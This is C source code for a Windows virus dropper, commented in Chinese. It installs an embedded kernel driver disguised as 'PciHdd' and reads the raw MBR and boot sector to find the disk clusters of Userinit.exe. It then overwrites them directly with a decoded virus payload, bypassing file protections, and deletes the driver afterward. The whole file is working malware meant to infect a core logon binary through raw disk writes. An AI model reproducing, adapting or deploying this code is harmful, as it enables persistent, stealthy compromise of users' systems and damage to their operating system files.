#include "stdafx.h"
#include <poppack.h>
#include <pshpack1.h>
//==============================================================================
#define PARTITION_TYPE_NTFS 0x07
#define PARTITION_TYPE_FAT32 0x0B
#define PARTITION_TYPE_FAT32_LBA 0x0C
#define STR_SYSFILE_PATH TEXT("%SystemRoot%\\system32\\drivers\\pcihdd.sys")
#define STR_VIRFILE_PATH TEXT("%SystemRoot%\\System32\\Userinit.exe")
#define STR_DSKDEVICE_NAME TEXT("\\\\.\\PhysicalDrive0")
#define STR_HDDDEVICE_NAME TEXT("\\\\.\\PhysicalHardDisk0")
#define IOCTL_MYDEV_BASE 0xF000
#define IOCTL_MYDEV_Fun_0xF01 CTL_CODE(IOCTL_MYDEV_BASE, 0xF01, METHOD_BUFFERED, FILE_ANY_ACCESS)
//==============================================================================
typedef struct _PARTITION_ENTRY
{
   UCHAR active;                 // 能否启动标志
   UCHAR StartHead;               // 该分区起始磁头号
   UCHAR StartSector;             // 起始柱面号高2位：6位起始扇区号
   UCHAR StartCylinder;           // 起始柱面号低8位
   UCHAR PartitionType;           // 分区类型
   UCHAR EndHead;                 // 该分区终止磁头号
   UCHAR EndSector;               // 终止柱面号高2位：6位终止扇区号
   UCHAR EndCylinder;             // 终止柱面号低8位
   ULONG StartLBA;               // 起始扇区号
   ULONG TotalSector;             // 分区尺寸（总扇区数）
} PARTITION_ENTRY, *PPARTITION_ENTRY;
//==============================================================================
typedef struct _MBR_SECTOR
{
   UCHAR             BootCode[446];
   PARTITION_ENTRY   Partition[4];
   USHORT           Signature;
} MBR_SECTOR, *PMBR_SECTOR;
//==============================================================================
typedef struct _BBR_SECTOR
{
   USHORT JmpCode;               // 2字节跳转指令,跳转到引导代码
   UCHAR   NopCode;               // 1字节nop指令,填充用,保证跳转指令长3个字节
   UCHAR   OEMName[8];             // 8字节的OEMName
   // 下面开始为: BPB( BIOS Parameter Block )
   USHORT BytesPerSector;         // 每个扇区的字节数 (512 1024 2048 4096)
   UCHAR   SectorsPerCluster;     // 每个簇的扇区数 ( 1 2 4 8 16 32 64 128 )两者相乘不能超过32K(簇最大大小)
   USHORT ReservedSectors;       // 从卷的第一个扇区开始的保留扇区数目,该值不能为0，对于FAT12/FAT16，该值通常为1,对于FAT32，典型值为32
   UCHAR   NumberOfFATs;           // 卷上FAT数据结构的数目，该值通常应为2,[NTFS不使用NumberOfFATs字段，必须为0]
   USHORT RootEntries;           // 对于FAT12/FAT16,该值表示32字节目录项的数目,对于FAT32，该值必须为0；[NTFS不使用]
   USHORT NumberOfSectors16;     // 该卷上的扇区总数，该字段可以为0，如果该字段为0，则NumberOfSectors32不能为0；对于FAT32，该字段必须为0 [FAT32/NTFS不使用该字段]
   UCHAR   MediaDescriptor;       // 介质类型
   USHORT SectorsPerFAT16;       // 该字段标识一个FAT结构占有的扇区数（FAT12/FAT16）,对于FAT32卷，该字段必须为0；[FAT32/NTFS不使用该字段]
   USHORT SectorsPerTrack;       // 用于INT 0x13中断的每个磁道的扇区数
   USHORT HeadsPerCylinder;       // 用于INT 0x13中断的每个柱面的磁头数
   ULONG   HiddenSectors;         // 包含该FAT卷的分区之前的隐藏扇区数
   ULONG   NumberOfSectors32;     // 该字段包含该卷上的所有扇区数目，对于FAT32，该字段不为0；FAT12/FAT16可根据实际大小是否超过65536个扇区数决定是否采用该字段； [NTFS不使用该字段]
   // 下面开始为: EBPB ( Extended BIOS Parameter Block )
   ULONG   SectorsPerFAT32;       // 对于FAT32，该字段包含一个FAT的大小，而SectorsPerFAT16字段必须为0;
} BBR_SECTOR, *PBBR_SECTOR;
//==============================================================================
DWORD InstallAndStartDriver(HMODULE ModuleHandle)
{
   TCHAR           filePath[MAX_PATH];
   HANDLE           fileHandle;
   HRSRC           hSysRes;
   DWORD           dwWritten;
   DWORD           dwSysLen;
   PVOID           lpSysBuf;
   SC_HANDLE       hSCManager;
   SC_HANDLE       hService;
   SERVICE_STATUS   sService;
   DWORD           errCode = ERROR_SUCCESS;
   if(
     (NULL == (hSysRes = FindResource(ModuleHandle, (LPCTSTR)1001, 
(LPCTSTR)1001)))
     ||
     (0     == (dwSysLen = SizeofResource(ModuleHandle, hSysRes)))
     ||
     (NULL == (lpSysBuf = LockResource(hSysRes)))
     ||
     (0     == ExpandEnvironmentStrings(STR_SYSFILE_PATH, &filePath[0], 
sizeof(filePath)))
     ||
     (INVALID_HANDLE_VALUE == (fileHandle = CreateFile(filePath, 
GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)))
     )
   {
     errCode = GetLastError();
     goto FunExit00;
   }
   if(
     !WriteFile(fileHandle, lpSysBuf, dwSysLen, &dwWritten, NULL)
     ||
     !SetEndOfFile(fileHandle)
     ||
     !FlushFileBuffers(fileHandle)
     )
   {
     errCode = GetLastError();
   }
   CloseHandle(fileHandle);
   if(ERROR_SUCCESS != errCode)
   {
     goto FunExit01;
   }
   if(NULL == (hSCManager = OpenSCManager(NULL, NULL, 
SC_MANAGER_ALL_ACCESS)))
   {
     errCode = GetLastError();
     goto FunExit01;
   }
   hService = CreateService(
     hSCManager,
     TEXT("PciHdd"),
     TEXT("PciHdd"),
     SERVICE_ALL_ACCESS,
     SERVICE_KERNEL_DRIVER,
     SERVICE_DEMAND_START,
     SERVICE_ERROR_IGNORE,
     filePath,
     NULL,
     NULL,
     NULL,
     NULL,
     NULL
     );
   if(NULL != hService)
   {
     CloseServiceHandle(hService);
   }
   else
   {
     if(NULL != (hService = OpenService(hSCManager, TEXT("PciHdd"), 
SERVICE_ALL_ACCESS)))
     {
       ControlService(hService, SERVICE_CONTROL_STOP, &sService);
       DeleteService(hService);
       CloseServiceHandle(hService);
     }
     hService = CreateService(
       hSCManager,
       TEXT("PciHdd"),
       TEXT("PciHdd"),
       SERVICE_ALL_ACCESS,
       SERVICE_KERNEL_DRIVER,
       SERVICE_DEMAND_START,
       SERVICE_ERROR_IGNORE,
       filePath,
       NULL,
       NULL,
       NULL,
       NULL,
       NULL
       );
     if(NULL != hService)
     {
       CloseServiceHandle(hService);
     }
     else
     {
       errCode = GetLastError();
       goto FunExit02;
     }
   }
   if(NULL == (hService = OpenService(hSCManager, TEXT("PciHdd"), 
SERVICE_START)))
   {
     errCode = GetLastError();
     goto FunExit02;
   }
   StartService(hService, 0, NULL);
   CloseServiceHandle(hService);
FunExit02:
   CloseServiceHandle(hSCManager);
FunExit01:
   DeleteFile(filePath);
FunExit00:
   return errCode;
}
//==============================================================================
DWORD StopAndDeleteDriver(VOID)
{
   TCHAR           filePath[MAX_PATH];
   SC_HANDLE       hSCManager;
   SC_HANDLE       hService;
   SERVICE_STATUS   sService;
   DWORD           errCode = ERROR_SUCCESS;
   if(NULL == (hSCManager = OpenSCManager(NULL, NULL, 
SC_MANAGER_ALL_ACCESS)))
   {
     errCode = GetLastError();
     goto FunExit00;
   }
   if(NULL == (hService = OpenService(hSCManager, TEXT("PciHdd"), 
SERVICE_ALL_ACCESS)))
   {
     errCode = GetLastError();
     goto FunExit01;
   }
   ControlService(hService, SERVICE_CONTROL_STOP, &sService);
   DeleteService(hService);
   CloseServiceHandle(hService);
FunExit01:
   CloseServiceHandle(hSCManager);
FunExit00:
   ExpandEnvironmentStrings(STR_SYSFILE_PATH, &filePath[0], 
sizeof(filePath));
   DeleteFile(filePath);
   return errCode;
}
//==============================================================================
// 感染硬盘第一个分区的指定的文件
// 
// 1)通过FSCTL_GET_RETRIEVAL_POINTERS获取文件数据的分布 信息
// 
// 2)通过直接访问硬盘(\\\\.\\PhysicalHardDisk0)的的MDR和第一个分区的引导扇区得到分区参数来定位文件。
// 
// 3)通过对比ReadFile读取的文件数据和自己定位后直接 读取所得到的文件数据，确定定位是否正确
// 
// 入口参数:
// 要感染的文件名（完整路径）
// 
// Return value:
// Success -> NULL
// Failed   -> 指向出错信息的指针
//==============================================================================
DWORD WriteVirusToDisk(LPCTSTR VirusFile)
{
   STARTING_VCN_INPUT_BUFFER   iVcnBuf;
   UCHAR                       oVcnBuf[272];
   PRETRIEVAL_POINTERS_BUFFER lpVcnBuf;
   DWORD                       dwVcnExtents;
   LARGE_INTEGER               startLcn;
   PUCHAR                     lpClusterBuf;
   DWORD                       dwClusterLen;
   UCHAR                       dataBuf[512];
   UCHAR                       diskBuf[512];
   DWORD                       dataLen;
   LARGE_INTEGER               diskPos;
   PPARTITION_ENTRY           lpPartition;
   ULONG                       dwPartitionStart;
   ULONG                       dwPartitionType;
   PBBR_SECTOR                 lpBootSector;
   DWORD                       SectorsPerCluster;
   HANDLE                     hHddDevice;
   HANDLE                     hDskDevice;
   HANDLE                     hVirusFile;
   DWORD                       errCode = ERROR_SUCCESS;
   if(INVALID_HANDLE_VALUE == (hHddDevice = CreateFileA(STR_HDDDEVICE_NAME, 
GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL)))
   {
     errCode = GetLastError();
     goto FunExit00;
   }
   if(INVALID_HANDLE_VALUE == (hVirusFile = CreateFileA(VirusFile, 
GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
FILE_FLAG_NO_BUFFERING, NULL)))
   {
     errCode = GetLastError();
     goto FunExit01;
   }
   iVcnBuf.StartingVcn.QuadPart = 0;
   RtlZeroMemory(oVcnBuf, sizeof(oVcnBuf));
   if(!DeviceIoControl(hVirusFile, FSCTL_GET_RETRIEVAL_POINTERS, &iVcnBuf, 
sizeof(iVcnBuf), &oVcnBuf[0], sizeof(oVcnBuf), &dataLen, NULL))
   {
     errCode = GetLastError();
     goto FunExit02;
   }
   lpVcnBuf = (PRETRIEVAL_POINTERS_BUFFER)&oVcnBuf[0];
   dwVcnExtents = lpVcnBuf->ExtentCount;
   startLcn     = lpVcnBuf->Extents[0].Lcn;
   if(!dwVcnExtents)
   {
     errCode = (ULONG)(-3); // 文件太小, 不能操作
     goto FunExit02;
   }
   if(startLcn.QuadPart == -1)
   {
     errCode = (ULONG)(-4); // 该文件是压缩文件, 不能操作
     goto FunExit02;
   }
   ReadFile(hVirusFile, dataBuf, sizeof(dataBuf), &dataLen, NULL);
   // 打开第一个物理硬盘
   if(INVALID_HANDLE_VALUE == (hDskDevice = CreateFileA(STR_DSKDEVICE_NAME, 
GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, 
OPEN_EXISTING, 0, NULL)))
   {
     errCode = GetLastError();
     goto FunExit02;
   }
   // 读取硬盘第一个扇区(MBR)
   SetFilePointer(hDskDevice, 0, NULL, FILE_BEGIN);
   ReadFile(hDskDevice, diskBuf, sizeof(diskBuf), &dataLen, NULL);
   lpPartition = &(((PMBR_SECTOR)&diskBuf[0])->Partition[0]);
   if(lpPartition[0].active != 0x80)
   {
     errCode = (ULONG)(-1); // 分区不是启动分区
     goto FunExit03;
   }
   dwPartitionType = lpPartition[0].PartitionType;
   if(
     dwPartitionType != PARTITION_TYPE_FAT32
     &&
     dwPartitionType != PARTITION_TYPE_FAT32_LBA
     &&
     dwPartitionType != PARTITION_TYPE_NTFS
     )
   {
     errCode = (ULONG)(-2); // 不支持的磁盘分区
     goto FunExit03;
   }
   dwPartitionStart = lpPartition[0].StartLBA;
   diskPos.QuadPart = dwPartitionStart * 512;
   // 读取启动分区的第一个扇区(启动扇区)
   SetFilePointer(hDskDevice, diskPos.LowPart, &diskPos.HighPart, 
FILE_BEGIN);
   ReadFile(hDskDevice, diskBuf, sizeof(diskBuf), &dataLen, NULL);
   lpBootSector = (PBBR_SECTOR)&diskBuf[0];
   SectorsPerCluster = lpBootSector->SectorsPerCluster;
   // 根据FAT32/NTFS计算Userinit的起始簇的偏移量
   diskPos.QuadPart = dwPartitionStart;
   diskPos.QuadPart+= lpBootSector->ReservedSectors;
   if(dwPartitionType == PARTITION_TYPE_FAT32 || dwPartitionType == 
PARTITION_TYPE_FAT32_LBA)
   {
     diskPos.QuadPart+= lpBootSector->NumberOfFATs * 
lpBootSector->SectorsPerFAT32;
   }
   diskPos.QuadPart+= startLcn.QuadPart * SectorsPerCluster;
   diskPos.QuadPart*= 512;
   // 检查文件寻址
   SetFilePointer(hDskDevice, diskPos.LowPart, &diskPos.HighPart, 
FILE_BEGIN);
   ReadFile(hDskDevice, diskBuf, sizeof(diskBuf), &dataLen, NULL);
   if(!RtlEqualMemory(dataBuf, diskBuf, sizeof(diskBuf)))
   {
     errCode = (ULONG)(-5); // 寻址文件不成功
     goto FunExit03;
   }
   // 分配缓冲
   dwClusterLen = SectorsPerCluster*512;
   lpClusterBuf = (PUCHAR)GlobalAlloc(GMEM_ZEROINIT, dwClusterLen); // 保存一个簇所要的缓冲
   if(!lpClusterBuf)
   {
     errCode = GetLastError(); // 寻址文件不成功
     goto FunExit03;
   }
   // 把Virus文件的数据从SYS文件资源段中解码出来
   if(!DeviceIoControl(
     hVirusFile,
     IOCTL_MYDEV_Fun_0xF01,
     (PVOID)0x00401000,         // 本执行文件代码段的开始, 在C语言中我不会表达
     0x73E,                     // 本执行文件代码段的长度, 在C语言中我不会表达
     lpClusterBuf,
     dwClusterLen,
     &dataLen,
     NULL
     ))
   {
     errCode = GetLastError();
     goto FunExit04;
   }
   // 写Virus文件的数据到磁盘
   SetFilePointer(hDskDevice, diskPos.LowPart, &diskPos.HighPart, 
FILE_BEGIN);
   WriteFile(hDskDevice, lpClusterBuf, dwClusterLen, &dataLen, NULL);
   FlushFileBuffers(hDskDevice);
   errCode = ERROR_SUCCESS;
FunExit04:
   GlobalFree(lpClusterBuf);
FunExit03:
   CloseHandle(hDskDevice);
FunExit02:
   CloseHandle(hVirusFile);
FunExit01:
   CloseHandle(hHddDevice);
FunExit00:
   return errCode;
}

//==============================================================================
int _tmain(int argc, _TCHAR* argv[])
{
   TCHAR filePath[MAX_PATH];
   DWORD errCode;
   if(ERROR_SUCCESS != (errCode = InstallAndStartDriver(GetModuleHandleA(NULL))))
   {
     MessageBox(NULL, TEXT("驱动程序的加载没有成功,程序将无法运行"), NULL, MB_ICONERROR);
     goto FunExit00;
   }
   ExpandEnvironmentStrings(STR_VIRFILE_PATH, &filePath[0], sizeof(filePath));
   WriteVirusToDisk(filePath);
   StopAndDeleteDriver();
   FunExit00:
	return 0;
}